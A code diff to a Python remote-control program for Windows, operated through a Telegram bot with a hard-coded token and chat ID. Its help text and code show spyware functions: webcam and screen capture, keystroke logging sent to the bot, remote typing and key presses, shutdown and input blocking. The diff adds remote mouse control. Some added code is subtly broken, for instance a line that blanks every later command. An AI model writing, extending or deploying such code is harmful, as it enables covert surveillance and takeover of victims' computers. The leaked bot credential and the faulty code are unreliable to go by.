@@ -1,12 +1,11 @@
 chat_user_id = 496266339
 ######################
-# new command !+time on auto scr
-#added russian keyboard to log
-#removed russian text from code and comments
+#2.4
+#mouse!!!!! m.hel
 ######################
 bot_token = '2060724050:AAFf56IHazMb7OulkyKyxbxznySQX20jWU8'
 import subprocess
-import sys
+# import sys
 import os
 import getpass
 from ctypes import *
@@ -19,7 +18,7 @@ import win32gui
 from time import sleep
 #import ctypes
 #user32 = ctypes.windll.user32
-versi = '2.311'
+versi = '2.4'
 
 
 
@@ -60,6 +59,12 @@ import requests
 #import pyautogui 
 #import base64
 
+
+import win32api, win32con
+import random 
+import time
+random.seed()
+
 timescreen = 0
 
 
@@ -69,7 +74,7 @@ timescreen = 0
 
 
 log = ''
-help_text = 'Version '+versi+' Name '+USER_NAME+' \n \nhelp - help \ncam - send cam snapshot\nsave r -  start ribbons screensaver \nsave b - start screensaver bubbles \n w>url to jpg< - set wallpaper \nn _text_ create notification\nlog - send full log \nread - send readable log \nscr - send a png screenshot \ndel. - delay \npri. - write text \nprs. - press buttons \ndone - exit \ns ___text___ - speech synthezz \nerr - error sound \nshut - shut\ni - open image\nclose - close image\n_status - ??????'
+help_text = 'Version '+versi+' Name '+USER_NAME+' \n \nhelp - help \n m.hel - help mouse command\ncam - send cam snapshot\nsave r -  start ribbons screensaver \nsave b - start screensaver bubbles \n w>url to jpg< - set wallpaper \nn _text_ create notification\nlog - send full log \nread - send readable log \nscr - send a png screenshot \ndel. - delay \npri. - write text \nprs. - press buttons \ndone - exit \ns ___text___ - speech synthezz \nerr - error sound \nshut - shut\ni - open image\nclose - close image\n_status - ??????'
 mkfl = False
 #close the programm 
 #NEEDS TESTING
@@ -87,10 +92,20 @@ def scr():
 	bot.send_photo(chat_id=chat_user_id, photo=byte_img)
 
 #every message calls this
+
+mset = 10
+mtme = 0.3
+xmx = 1920
+ymx = 1080
+
 def message_handler(update: Update, context: CallbackContext):
 	text = update.message.text
 	global mkfl
 	global timescreen
+	global mset
+	global mtme
+	global xmx
+	global ymx
 	if not text:
 		return
 	mas = text.split('\n')		#keys: alt, ctrl, space, enter, delete
@@ -105,6 +120,57 @@ def message_handler(update: Update, context: CallbackContext):
 				keyboard.write(par)
 			elif com == 'prs.':		#prs.alt+tab
 				keyboard.send(par)
+	
+	if text[:2] == 'm.':
+	# set - кол во циклов defolt 10
+	# rnd - запуск рандомайзера
+	# tme - задержка между передвижениями defolt 0.3
+	# hel - help для команды mouse
+	# xmx - максимальное значение х defolt 1920
+	# yxm - максимальное значение для y defolt 1080
+	# mcl - left click 
+	# mcr - right click
+	# hid теребоньканье курсора +- 10 пикселей
+		helptext = 'm.\n	 rnd - запуск рандомайзера\n hid теребоньканье курсора +- 10 пикселей \n mcl - left click \n mcr - right click \nНАСТРОЙКА:\n set - кол во циклов defolt 10\n tme - задержка между передвижениями defolt 0.3\n hel - help для команды mousexmx - максимальное значение х defolt 1920 \n yxm - максимальное значение для y defolt 1080  \n '
+		text = text[2:]
+		mcom = text[:3]
+		text = text[3:]
+		if mcom == 'set':
+			mset = int(text)
+		if mcom == 'tme':
+			mtme = float(text)
+		if mcom == 'xmx':
+			xmx = int(text)
+		if mcom == 'ymx':
+			ymx = int(text)
+		if mcom == 'hel':
+				bot.send_message(chat_id=chat_user_id, text=helptext)
+		if mcom == 'rnd':
+			for i in range(mset):
+				x = random.randint(1, xmx)
+				y = random.randint(1, ymx)
+				win32api.SetCursorPos((x,y))
+				time.sleep(mtme)
+		if mcom == 'mcl':
+			(x,y)=win32gui.GetCursorPos()
+			win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,x,y,0,0)
+			win32api.mouse_event(win32con.MOUSEEVENTF_UP,x,y,0,0)
+		if mcom == 'mcr':
+			(x,y)=win32gui.GetCursorPos()
+			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN,x,y,0,0)
+			time.sleep(0.05)
+			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP,x,y,0,0)
+		if mcom == 'hid':
+			for i in range(mset):
+				(x,y)=win32gui.GetCursorPos()
+				x = random.randint(x-10, x+10)
+				y = random.randint(y-10, y+10)				
+				win32api.SetCursorPos((x,y))
+				time.sleep(mtme)			
+			
+
+		
+	text = ' '
 
 	if text == 'help':
 		bot.send_message(chat_id=chat_user_id, text=help_text)
@@ -144,7 +210,7 @@ def message_handler(update: Update, context: CallbackContext):
 	elif text == 'close':
 		keyboard.send('`')
 	elif text == '_stop':
-			global mkfl
+			#global mkfl
 			if mkfl == True:
 				mkfl = False
 			else:
@@ -320,15 +386,17 @@ def callback(event):
 
 def mouseandkeyboard():
 	global mkfl
-
+'''
 	while True:
 		global mkfl
-		#print(mkfl)
+		##print(mkfl)
 		if mkfl==True:
 			windll.user32.BlockInput(True)
+			print(mkfl)
 		else:
 			windll.user32.BlockInput(False)
-			
+			print(mkfl)
+'''
 def autoscreen():
 	while True:
 		global timescreen
